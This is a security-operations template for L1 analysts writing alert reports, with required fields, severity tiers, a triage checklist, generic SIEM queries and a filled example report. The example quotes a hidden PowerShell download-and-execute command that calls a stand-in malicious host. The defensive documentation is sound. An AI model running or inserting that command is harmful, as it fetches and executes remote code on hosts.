# Alert Reporting Template
Path suggestion: `SOC/reports/alert_report_template.md`

## Purpose
This document defines a standard format for L1 analysts to write alert reports. Asking L1 analysts to write short reports, in addition to marking True/False Positive, is important because:

- Provide context for escalation, saving L2 analysts time and helping them understand what happened quickly.  
- Save findings for the records. Raw SIEM logs are stored for limited time, but alert context should be kept indefinitely.  
- Improve investigation skills. Writing a simple explanation forces analysts to understand the alert.

---

## Who should fill this
- Primary: L1 analyst who triaged the alert.  
- Secondary: L2 analyst, DFIR, or SOC lead that reviews or updates the report.

---

## Report format: Five Ws approach
Imagine you are an L2 analyst, a DFIR team member, or an IT person who needs to understand the alert. Use the Five Ws to structure the report.

| Section | What to include |
|--------:|-----------------|
| Who | Which user, service, or process performed the activity. Include username, service account, host owner, or process name. |
| What | Exact action or event sequence. Include log messages, commands, filenames, hashes, URLs. |
| When | Exact timestamps for when suspicious activity started and ended, with timezone. Use ISO 8601 if possible, e.g. 2025-10-13T14:05:00+02:00. |
| Where | Device hostname, IP addresses, network segment, cloud account, or website involved. |
| Why | Final verdict and reasoning. Explain why you marked the alert True Positive, False Positive, or Uncertain. Provide evidence that supports your decision. |

---

## Minimal required fields (for every alert report)
- Report ID: `soc-YYYYMMDD-####`  
- Analyst: name or handle of the person who wrote the report  
- Date created: ISO 8601 timestamp  
- Alert source: SIEM rule or EDR alert name and ID  
- Priority / Severity: (Critical, High, Medium, Low) see severity guidance below  
- Verdict: True Positive, False Positive, Needs Escalation, False Negative, or Unknown  
- Five Ws: Who, What, When, Where, Why (use the sections below)  
- Evidence summary: key logs, commands, filenames, hashes, screenshots, packet captures, etc. Attach artifacts or links.  
- Actions taken: triage, containment, remediation steps performed (commands run, accounts disabled, hosts isolated)  
- Suggested next steps: who to escalate to and what to do next  
- Tags: ATT&CK techniques, asset owner, business unit, ticket ID (if created)  
- References: rules, KB articles, vendor docs, playbooks

---

## Severity guidance (example)
- Critical: Active ransomware, confirmed data exfiltration, domain compromise, or active lateral movement to sensitive assets.  
- High: Confirmed compromise on a production host, credential theft tools running, or high confidence malware.  
- Medium: Suspicious activity that may be benign but requires follow up, or low confidence on malicious indicators.  
- Low: Informational alerts, failed scans, known noisy activities with low business impact.

---

## Suggested investigation checklist (L1)
1. Confirm basic alert metadata: timestamps, rule ID, source system.  
2. Identify affected host(s), user(s), and process(es).  
3. Pull recent logs around the event time (+/- 15 minutes).  
4. Query EDR for process tree, parent PID, child processes, command line.  
5. Check network connections from the host during the timeframe. Note IPs, domains, ports.  
6. Search for known indicators: file hash, domain, URL, IP in threat intel feeds.  
7. Check for known benign causes (scheduled scans, admin tasks, monitoring tools). Document any benign explanation.  
8. Decide verdict: True Positive, False Positive, or escalate to L2. Explain reasoning.  
9. Record actions taken and suggested follow up. Attach artifacts.

---

## Evidence and artifacts to attach or link
- SIEM event IDs and raw log snippets (not full logs unless needed)  
- EDR process tree screenshot or JSON export  
- File hashes (MD5, SHA1, SHA256) and where they were found  
- Packet capture or PCAP excerpt (if network relevant)  
- Screenshots of suspicious UI or process lists  
- Exported YARA or Sigma matches, if used  
- Links to threat intelligence hits and their source

---

## Suggested SIEM fields to include in the report
- `event.time` (ISO timestamp)  
- `host.hostname`  
- `host.ip`  
- `user.name`  
- `process.name` and `process.cmdline`  
- `file.hash.sha256`  
- `network.direction`, `destination.ip`, `destination.port`, `url.full`  
- `alert.rule.name` and `alert.rule.id`  
- `event.id` or `log.id`

---

## Example hunting queries (generic)
- Find process executions from host in last hour:


index=endpoint host="HOSTNAME" earliest=-1h | stats count by process, user, command_line

```
- Look for outbound connections to suspicious IP:
```

index=network dest_ip="1.2.3.4" | stats count by src_ip, src_port, dest_port

```
- Search for known hash:
```

index=file hash.sha256="SOMEHASH" | table _time host file_path user


Adapt queries to Splunk, Elastic, or your SIEM language.

---

## Example report (filled)
Report ID: soc-20251013-0001  
Analyst: daniel_kaas  
Date created: 2025-10-13T14:20:00+02:00  
Alert source: "Suspicious PowerShell Download", rule id PS-1024  
Priority: High  
Verdict: True Positive

Who  
- User: svc-backup (service account)  
- Host: filesrv01.example.local (192.168.10.21)

What  
- Event sequence: 2025-10-13T13:58:12+02:00 Host executed `powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://malicious.example/p');"`  
- File created: `C:\Windows\Temp\payload.exe`, SHA256 `aaaaaaaa...`

When  
- Start: 2025-10-13T13:58:12+02:00  
- Last seen: 2025-10-13T14:05:32+02:00

Where  
- Host: filesrv01.example.local, VLAN: servers, public IP seen contacting `malicious.example` 45.77.123.10 at port 80

Why  
- Reasoning: Command line is an exact match of known "download and execute" pattern. EDR process tree shows `powershell.exe` spawned from `schtasks.exe` running under service account. File hash is not present in internal whitelist and matched VT indicator with low confidence malicious. Multiple outbound connections to `45.77.123.10` within one minute of execution. No scheduled maintenance or approved script found. Marked as True Positive.

Evidence summary  
- SIEM event ids: 987654321, 987654322  
- EDR process tree JSON: `edr/export/filesrv01_proc_20251013.json`  
- File hash: SHA256 `aaaaaaaa...` (sampled and uploaded to sandbox)  
- PCAP: `pcap/filesrv01_20251013.pcap` showing HTTP GET to `malicious.example/p`

Actions taken  
- Isolated host from network at 2025-10-13T14:10:00+02:00  
- Disabled svc-backup account at 2025-10-13T14:12:30+02:00 (notified IT for password reset)  
- Uploaded file to malware sandbox for deeper analysis  
- Created ticket ITSM-12345 and assigned to L2/DFIR

Suggested next steps  
- L2 DFIR to perform disk image and full memory capture.  
- Network team to block 45.77.123.10 and domain `malicious.example` at perimeter.  
- Review other hosts for same SHA256 or command pattern.  
- Perform credential audit for svc-backup account.

Tags  
- ATT&CK: T1105, T1059.001, T1078  
- Asset owner: Storage team

References  
- Playbook: `playbooks/malware-investigation.md`  
- Rule: PS-1024 documentation

---

## Quick checklist for L1 before closing an alert
- [ ] Five Ws filled out, with timestamps and assets  
- [ ] Evidence attached or linked  
- [ ] Verdict and short reasoning provided  
- [ ] Actions taken recorded with exact times and commands  
- [ ] Ticket created in ITSM if required, and ticket ID added to the report  
- [ ] Escalation recommended if required, with clear rationale

---

## Template (copy/paste)
Use this as a minimal report template you can paste into your ticketing system or SIEM note field.


Report ID:
Analyst:
Date created:

Alert source:
Priority:
Verdict:

Who:
What:
When:
Where:
Why:

Evidence summary:
Actions taken:
Suggested next steps:
Tags:
References:


---

## Notes and best practices
- Use UTC or explicit timezone in timestamps to avoid confusion.  
- Keep the initial L1 report concise and evidence focused. L2 can expand the narrative.  
- When unsure, escalate and mark the report as "Needs Escalation" rather than guessing.  
- Treat L1 reporting as a learning opportunity. Provide feedback to analysts so their next reports get sharper.

---
